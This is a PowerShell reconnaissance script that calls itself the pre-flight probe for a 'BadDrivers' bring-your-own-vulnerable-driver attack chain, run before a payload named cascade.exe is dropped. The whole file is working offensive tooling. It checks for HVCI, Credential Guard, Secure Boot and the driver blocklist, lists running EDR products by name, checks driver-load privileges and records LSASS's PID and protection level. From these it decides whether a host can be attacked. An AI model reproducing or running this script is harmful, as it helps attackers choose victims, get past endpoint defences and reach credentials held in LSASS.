# deploy/probe.ps1 — pre-flight system reconnaissance
#
# Read-only. Emits a JSON report describing the target's suitability for the
# BadDrivers BYOVD chain. Run this BEFORE dropping cascade.exe to abort early
# on incompatible hosts (HVCI, Credential Guard, driver blocklist, etc.).
#
# Usage:
#   powershell -ep bypass -f probe.ps1 [-Json] [-OutFile probe.json]
#
# Exits:
#   0 - system compatible (proceed with BYOVD)
#   1 - system incompatible (HVCI or CG active)
#   2 - system compatible with warnings (blocklist on, secure boot, etc.)

param(
    [switch]$Json,
    [string]$OutFile
)

$ErrorActionPreference = 'SilentlyContinue'
$result = [ordered]@{
    hostname            = $env:COMPUTERNAME
    os_build            = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').CurrentBuild
    os_display          = (Get-CimInstance Win32_OperatingSystem).Caption
    vbs_enabled         = $false
    hvci_enabled        = $false
    credential_guard    = $false
    secure_boot         = $false
    driver_blocklist    = $false
    defender_running    = $false
    other_edrs          = @()
    is_admin            = $false
    driver_load_priv    = $false
    lsass_pid           = 0
    lsass_protection    = 'unknown'
    warnings            = @()
    verdict             = 'unknown'
}

# --- Admin / privilege check --------------------------------------------------
$id = [Security.Principal.WindowsIdentity]::GetCurrent()
$result.is_admin = (New-Object Security.Principal.WindowsPrincipal($id)).IsInRole(
    [Security.Principal.WindowsBuiltinRole]::Administrator)
$result.driver_load_priv = (whoami /priv 2>$null | Select-String 'SeLoadDriverPrivilege') -ne $null

# --- VBS / HVCI / Credential Guard -------------------------------------------
try {
    $dg = Get-CimInstance -Namespace 'root\Microsoft\Windows\DeviceGuard' `
        -ClassName 'Win32_DeviceGuard' -ErrorAction Stop
    $result.vbs_enabled      = ($dg.VirtualizationBasedSecurityStatus -ge 2)
    $result.hvci_enabled     = ($dg.SecurityServicesRunning -contains 2)
    $result.credential_guard = ($dg.SecurityServicesRunning -contains 1)
} catch {
    # Fall back to registry
    $dgKey = 'HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard'
    if (Test-Path $dgKey) {
        $vbs = (Get-ItemProperty $dgKey -Name VirtualizationBasedSecurityStatus).VirtualizationBasedSecurityStatus
        $result.vbs_enabled = ($vbs -ge 2)
    }
    $hvciKey = "$dgKey\Scenarios\HypervisorEnforcedCodeIntegrity"
    if (Test-Path $hvciKey) {
        $result.hvci_enabled = ((Get-ItemProperty $hvciKey -Name Enabled).Enabled -eq 1)
    }
    $cgKey = "$dgKey\Scenarios\CredentialGuard"
    if (Test-Path $cgKey) {
        $result.credential_guard = ((Get-ItemProperty $cgKey -Name Enabled).Enabled -eq 1)
    }
}

# --- Secure Boot -------------------------------------------------------------
try { $result.secure_boot = (Confirm-SecureBootUEFI) } catch {}

# --- Vulnerable Driver Blocklist ---------------------------------------------
$ciKey = 'HKLM:\SYSTEM\CurrentControlSet\Control\CI\Config'
if (Test-Path $ciKey) {
    $v = (Get-ItemProperty $ciKey -Name VulnerableDriverBlocklistEnable).VulnerableDriverBlocklistEnable
    $result.driver_blocklist = ($v -eq 1)
}

# --- Defender status ---------------------------------------------------------
try {
    $mp = Get-MpComputerStatus -ErrorAction Stop
    $result.defender_running = $mp.RealTimeProtectionEnabled
} catch {}

# --- Other EDR products ------------------------------------------------------
$edrProcs = @('MsMpEng','SentinelAgent','CSFalconService','CylanceSvc',
              'ekrn','avp','TmCCSF','xagt','edr-agent','ds_agent')
foreach ($p in $edrProcs) {
    if (Get-Process -Name $p -ErrorAction SilentlyContinue) {
        $result.other_edrs += $p
    }
}

# --- LSASS info --------------------------------------------------------------
$lsass = Get-Process lsass -ErrorAction SilentlyContinue
if ($lsass) {
    $result.lsass_pid = $lsass.Id
    # PPL detection via reg (LsaCfgFlags is CG-related; separate from PPL)
    $lsaKey = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
    if (Test-Path $lsaKey) {
        $ppl = (Get-ItemProperty $lsaKey -Name RunAsPPL -ErrorAction SilentlyContinue).RunAsPPL
        if ($ppl -eq 1)      { $result.lsass_protection = 'PPL' }
        elseif ($ppl -eq 2)  { $result.lsass_protection = 'PPL_boot' }
        else                 { $result.lsass_protection = 'none' }
    }
}

# --- Warnings & verdict ------------------------------------------------------
if (-not $result.is_admin)      { $result.warnings += 'not_admin' }
if (-not $result.driver_load_priv) { $result.warnings += 'no_SeLoadDriverPrivilege' }
if ($result.hvci_enabled)       { $result.warnings += 'hvci_active_kernel_writes_blocked' }
if ($result.credential_guard)   { $result.warnings += 'credential_guard_lsass_secrets_isolated' }
if ($result.driver_blocklist)   { $result.warnings += 'driver_blocklist_may_block_load' }
if ($result.secure_boot -and $result.driver_blocklist) {
    $result.warnings += 'secureboot_plus_blocklist_high_risk'
}
if ($result.other_edrs.Count -gt 0) {
    $result.warnings += "edr_present:$($result.other_edrs -join ',')"
}

if ($result.hvci_enabled -or $result.credential_guard) {
    $result.verdict = 'incompatible'
} elseif ($result.warnings.Count -gt 0) {
    $result.verdict = 'compatible_with_warnings'
} else {
    $result.verdict = 'compatible'
}

# --- Output ------------------------------------------------------------------
if ($Json -or $OutFile) {
    $j = $result | ConvertTo-Json -Depth 4
    if ($OutFile) { $j | Out-File -FilePath $OutFile -Encoding utf8 }
    else          { Write-Output $j }
} else {
    Write-Host "=== BadDrivers Pre-Flight Probe ===" -ForegroundColor Cyan
    $result.GetEnumerator() | ForEach-Object {
        $c = 'White'
        if ($_.Key -eq 'verdict') {
            $c = @{compatible='Green';compatible_with_warnings='Yellow';incompatible='Red'}[$_.Value]
        }
        Write-Host ("  {0,-22}: {1}" -f $_.Key, ($_.Value -join ', ')) -ForegroundColor $c
    }
}

switch ($result.verdict) {
    'compatible'                { exit 0 }
    'compatible_with_warnings'  { exit 2 }
    default                     { exit 1 }
}
